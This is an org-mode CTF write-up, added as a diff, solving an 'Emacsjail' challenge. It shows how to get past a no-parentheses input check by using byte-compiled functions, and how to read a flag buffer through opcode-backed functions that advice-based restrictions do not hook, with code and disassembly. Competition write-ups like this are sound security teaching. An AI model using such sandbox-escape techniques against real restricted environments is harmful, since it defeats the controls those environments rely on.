@@ -1,0 +1,42 @@
+#+TITLE: Emacsjail
+#+DESCRIPTION: Mom, can we have SBCL? No, we have SBCL at home. SBCL at home:
+#+AUTHOR: George
+
+* Solve
+The first insight is that the restriction against parentheses can be bypassed by passing in a =byte-code-function= instead of an =interpreted-function= (and there aren't any function =symbol=​s which trivially solve the challenge).
+#+begin_src elisp :results scalar
+(defun check (input)
+  (not (string-match-p ".*(.*).*" input)))
+
+(format "%s, %s"
+        (check (prin1-to-string (lambda nil)))
+        (check (prin1-to-string (byte-compile (lambda nil)))))
+#+end_src
+
+#+RESULTS:
+: "nil, t"
+
+The second insight is that Emacs advice does not apply to functions which have dedicated opcodes in the Emacs Lisp bytecode interpreter.[fn::https://nullprogram.com/blog/2013/01/22/]
+There are two such functions, ~set-buffer~ and ~buffer-substring~, that allow us to extricate the flag.
+
+#+begin_src elisp
+(defun disass (form)
+  (with-temp-buffer
+    (disassemble (byte-compile form) (current-buffer))
+    (buffer-string)))
+
+(disass (lambda () (set-buffer "*flag.txt*") (buffer-substring (point-min) (point-max))))
+#+end_src
+
+#+RESULTS:
+: byte code:
+:   args: nil
+: 0       constant  "*flag.txt*"
+: 1       set-buffer 
+: 2       discard   
+: 3       point-min 
+: 4       point-max 
+: 5       buffer-substring 
+: 6       return    
+
+Note that ~byte-compile~ can behave strangely depending on your Emacs version and you might have to write the bytecode by hand, in which case the [[https://rocky.github.io/elisp-bytecode.pdf][Emacs Lisp Bytecode Reference Manual]] is very useful.
